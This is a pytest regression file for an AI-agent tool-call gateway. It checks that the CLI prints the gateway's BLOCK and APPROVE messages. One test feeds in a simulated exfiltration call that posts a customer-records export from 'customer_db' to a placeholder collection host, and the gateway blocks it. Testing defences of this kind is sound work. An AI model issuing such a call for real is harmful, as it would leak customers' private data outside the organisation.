"""FIX2-T: scripted CLI regression tests (kit Prompt FIX2-T).

Asserts, via the repository's REAL argparse/subprocess CLI path (no
Click/CliRunner):
- scripted Scenario B prints the human-facing denial message;
- the message comes from the same gateway `agent_message` field the Ollama
  handling prints (the exact string is taken from a live gateway response,
  proving a shared implementation rather than a duplicated literal);
- the BLOCK decision is still shown; the APPROVE message path is covered
  in-process for both BLOCK and APPROVE through main() itself.

The spawned gateway uses the repository data/ tree; Scenario B executes an
ALLOW (tainted read) and a BLOCK, so no sink file is written.
"""

import os
import socket
import subprocess
import sys
import time
from pathlib import Path

import pytest

TASK = "Summarize Q3 sales and post it to #sales."
DENIAL_PREFIX = "This request was denied by security policy"


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


@pytest.fixture()
def live_gateway():
    """Spawn the real gateway on an ephemeral port; yield the base URL."""
    port = _free_port()
    env = os.environ.copy()
    env["TASKFENCE_ADMIN_TOKEN"] = "devtoken"
    server = subprocess.Popen(
        [sys.executable, "-m", "uvicorn", "taskfence.gateway:app",
         "--port", str(port), "--log-level", "warning"],
        cwd=Path.cwd(), env=env,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    base = f"http://127.0.0.1:{port}"
    import httpx
    try:
        for _ in range(60):
            try:
                if httpx.get(f"{base}/audit", timeout=1).status_code == 200:
                    break
            except httpx.HTTPError:
                time.sleep(0.25)
        else:
            pytest.fail("spawned gateway did not become ready")
        yield base
    finally:
        server.terminate()
        server.wait(timeout=10)


def test_scripted_cli_scenario_b_prints_gateway_denial_message(
        live_gateway, tmp_path):
    """Full subprocess path: python -m taskfence.agent --scripted scenario_b
    against the live gateway. The printed denial text must be the EXACT
    agent_message the gateway returns for the same request — the same
    implementation the Ollama path prints, not a duplicated string."""
    import httpx

    # Capture the gateway's own agent_message for the identical flow:
    task_id = httpx.post(f"{live_gateway}/tasks",
                         json={"task_text": TASK},
                         timeout=10).json()["task_id"]
    gateway_response = httpx.post(
        f"{live_gateway}/tasks/{task_id}/tool-call",
        json={"tool": "post_external", "args": {
            "url": "https://collect.example.invalid/ingest",
            "payload": "customer records export",
            "source_assets": ["customer_db"],
            "transformation": "export"}}, timeout=10).json()
    assert gateway_response["decision"]["outcome"] == "BLOCK"
    expected_message = gateway_response["agent_message"]
    assert expected_message.startswith(DENIAL_PREFIX)

    env = os.environ.copy()
    env["TASKFENCE_URL"] = live_gateway
    env["TASKFENCE_ADMIN_TOKEN"] = "devtoken"
    result = subprocess.run(
        [sys.executable, "-m", "taskfence.agent",
         "--task", TASK, "--scripted", "scenario_b"],
        capture_output=True, text=True, timeout=120, cwd=Path.cwd(),
        env=env)
    assert result.returncode == 0, result.stderr[-1500:]

    out = result.stdout
    # The BLOCK decision is still shown:
    assert "read_file: ALLOW" in out
    assert "post_external: BLOCK" in out
    # The human-facing denial message is printed, exactly as the gateway
    # produced it (shared origin, printed once):
    assert expected_message in out
    assert out.count(expected_message) == 1


def test_scripted_main_prints_block_message_from_gateway_response(
        agent_client, capsys, monkeypatch):
    """In-process: main()'s scripted branch prints the response's
    agent_message on BLOCK — no gateway-constant import, no local wording."""
    from taskfence import agent as agent_mod
    monkeypatch.setattr(sys, "argv",
                        ["taskfence.agent", "--task", TASK,
                         "--scripted", "scenario_b"])
    agent_mod.main()
    out = capsys.readouterr().out
    assert "post_external: BLOCK" in out
    assert DENIAL_PREFIX in out
    # Decision line and message come from the same transcript entry; the
    # message is the gateway's §7 text, not a new literal:
    assert out.count(DENIAL_PREFIX) == 1


def test_scripted_main_prints_approve_message_for_pending_flow(
        agent_client, capsys, monkeypatch):
    """APPROVE parity: a script ending in a pending flow prints the
    gateway's approval-needed message, same field as the Ollama path."""
    from taskfence import agent as agent_mod
    monkeypatch.setitem(agent_mod.SCRIPTS, "scenario_approve_demo", [
        {"tool": "send_slack", "args": {
            "channel": "#sales", "text": "regional conversion summary",
            "source_assets": ["customer_db"]}},
    ])
    monkeypatch.setattr(sys, "argv",
                        ["taskfence.agent", "--task", TASK,
                         "--scripted", "scenario_approve_demo"])
    agent_mod.main()
    out = capsys.readouterr().out
    assert "send_slack: APPROVE" in out
    assert ("This request needs human approval" in out)
